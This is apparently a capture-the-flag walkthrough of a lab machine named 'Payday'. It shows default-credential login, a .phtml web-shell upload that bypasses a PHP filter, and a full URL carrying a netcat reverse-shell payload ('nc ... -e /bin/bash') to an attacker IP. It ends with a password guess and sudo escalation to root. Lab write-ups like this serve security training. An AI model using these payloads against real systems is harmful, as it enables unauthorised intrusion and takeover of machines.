Payday

Target IP: 192.168.170.39

Scanning


There are eight TCP ports open on the target machine.

Enumeration

Port 80: HTTP

The webpage above is displayed for this application.


I performed a directory search and obtained a bunch of result. I find /admin the most interesting. The /admin enables me to login. After spraying the default credentials admin:admin, I gained access to the website as admin. It is possible to change the appearance of the website using Template Editor functionality. I uploaded a txt file and it uploaded successfully, and I was able to look at it from my browser. I will try to upload a simple-web shell now.

Exploitation


I notice php files are not allowed to be uploaded. However, there are so many extensions for PHP files. With one being the phtml! I created a simple phtml web-shell and uploaded it successfully!


And my web-shell works! I browsed to http://192.168.170.39/skins/shell.phtml?cmd=whoami;id;ls; to access it! Time to upgrade to a full reverse shell!


And now I have a reverse shell as www-data. I have a foothold on the machine using the payload below.
Payload used: nc%20192.168.45.173%2080%20-e%20%2Fbin%2Fbash.
Full URL with payload: http://192.168.170.39/skins/shell.phtml?cmd=nc%20192.168.45.173%2080%20-e%20%2Fbin%2Fbash.

Privilege Escalation


The config.phpcontains the default username and password MySQL.


There is an interesting table called cscart_users with two entries. However, these credentials did not work.


I tried to bruteforce SSH and POP3 but it did not work. After hitting a dead-end, I tried patrick:patrick and this worked.


Aaaaand that's a wrap! Looks like patrick can run all commands using sudi. I used sudo bash to spawn a root shell.
